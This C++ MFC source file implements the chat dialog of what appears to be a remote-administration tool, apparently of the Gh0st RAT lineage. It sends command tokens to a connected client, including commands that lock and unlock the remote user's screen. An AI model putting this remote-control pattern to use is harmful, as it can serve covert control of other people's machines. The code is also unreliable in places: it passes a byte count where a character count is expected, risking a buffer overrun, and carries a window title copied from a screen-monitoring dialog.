// Chat.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "Chat.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CChat dialog


CChat::CChat(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(CChat::IDD, pParent)
{
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CHAT));
	//{{AFX_DATA_INIT(CChat)
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_bOnClose = FALSE;
}


void CChat::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CChat)
	//DDX_Control(pDX, IDC_EDIT_TIP, m_editTip);
	//DDX_Control(pDX, IDC_EDIT_NEWMSG, m_editNewMsg);
	//DDX_Control(pDX, IDC_EDIT_CHATLOG, m_editChatLog);
	//}}AFX_DATA_MAP
	DDX_Control(pDX, IDC_EDIT_TIP, m_editTip);
	DDX_Control(pDX, IDC_EDIT_NEWMSG, m_editNewMsg);
	DDX_Control(pDX, IDC_EDIT_CHATLOG, m_editChatLog);
}


BEGIN_MESSAGE_MAP(CChat, CDialog)
	//{{AFX_MSG_MAP(CChat)
	ON_BN_CLICKED(IDC_BUTTON_SEND, OnButtonSend)
	ON_BN_CLICKED(IDC_BUTTON_END, OnButtonEnd)
	ON_WM_CTLCOLOR()
	ON_EN_SETFOCUS(IDC_EDIT_CHATLOG, OnSetfocusEditChatLog)
	ON_EN_KILLFOCUS(IDC_EDIT_CHATLOG, OnKillfocusEditChatLog)
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_LOCK, &CChat::OnBnClickedButton_LOCK)
	ON_BN_CLICKED(IDC_UNLOCK, &CChat::OnBnClickedButton_UNLOCK)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CCHAT message handlers

BOOL CChat::OnInitDialog()
{
	CDialog::OnInitDialog();

	CString str;
	str.Format(_T("远程交谈  \\\\ %s"), m_pContext->szAddress),
	SetWindowText(str);
	m_editTip.SetWindowText(_T("第一条消息发送后，对方聊天对话框才会弹出"));
	m_editNewMsg.SetLimitText(4079);
	// TODO: Add extra initialization here
	BYTE bToken = COMMAND_NEXT_CChat;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CChat::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("高速屏幕监控 \\\\ %s  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}

void CChat::OnReceiveComplete()
{
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)_T(""), 1);
	CString strResult = (TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	SYSTEMTIME st;
	GetLocalTime(&st);
	TCHAR Text[8192] = { 0 };
	swprintf_s(Text, _T("%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n"), _T("对方:"),
		st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, strResult);
	if (m_editChatLog.GetWindowTextLength() >= 20000)
		m_editChatLog.SetWindowText(_T(""));
	m_editChatLog.SetSel(-1);
	m_editChatLog.ReplaceSel(Text);
}

void CChat::OnButtonSend()
{
	// TODO: Add your control notification handler code here
	TCHAR str[8159];
	GetDlgItemText(IDC_EDIT_NEWMSG, str, sizeof(str));
	if (_tcscmp(str, _T("")) == 0)
	{
		m_editNewMsg.SetFocus();
		return; // 发送消息为空不处理
	}
	m_editTip.ShowWindow(SW_HIDE);
	m_iocpServer->Send(m_pContext, (LPBYTE)str, lstrlen(str)*sizeof(TCHAR) + +sizeof(TCHAR));
	SYSTEMTIME st;
	GetLocalTime(&st);
	TCHAR Text[8192] = { 0 };
	swprintf_s(Text, _T("%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n"), _T("自己:"),
		st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, str);
	if (m_editChatLog.GetWindowTextLength() >= 20000)
		m_editChatLog.SetWindowText(_T(""));
	m_editChatLog.SetSel(-1);
	m_editChatLog.ReplaceSel(Text);
	m_editNewMsg.SetWindowText(_T(""));
	m_editNewMsg.SetFocus();

}

void CChat::OnButtonEnd()
{
	// TODO: Add your control notification handler code here
	SendMessage(WM_CLOSE, 0, 0);
}

void CChat::OnCancel()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}

HBRUSH CChat::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if (pWnd->GetDlgCtrlID() == IDC_EDIT_CHATLOG && nCtlColor == CTLCOLOR_STATIC)
	{
		COLORREF clr = RGB(0, 0, 0);
		pDC->SetTextColor(clr);   //设置黑色的文本
		clr = RGB(255, 255, 255);
		pDC->SetBkColor(clr);     //设置白色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else if (pWnd == &m_editTip && nCtlColor == CTLCOLOR_EDIT)
	{
		COLORREF clr = RGB(255, 0, 0);
		pDC->SetTextColor(clr);   //设置红色的文本
		clr = RGB(220, 220, 0);
		pDC->SetBkColor(clr);     //设置黄色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}

void CChat::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}

BOOL CChat::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_ESCAPE)
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CChat::OnSetfocusEditChatLog()
{
	// TODO: Add your control notification handler code here
	if (m_editTip.IsWindowVisible())
		m_editTip.RedrawWindow(NULL, NULL, RDW_INVALIDATE | RDW_FRAME);
}

void CChat::OnKillfocusEditChatLog()
{
	// TODO: Add your control notification handler code here
	if (m_editTip.IsWindowVisible())
		m_editTip.RedrawWindow(NULL, NULL, RDW_INVALIDATE | RDW_FRAME);
}



void CChat::OnBnClickedButton_LOCK()
{

	BYTE bToken = COMMAND_CHAT_SCREEN_LOCK;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}


void CChat::OnBnClickedButton_UNLOCK()
{
	BYTE bToken = COMMAND_CHAT_SCREEN_UNLOCK;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}
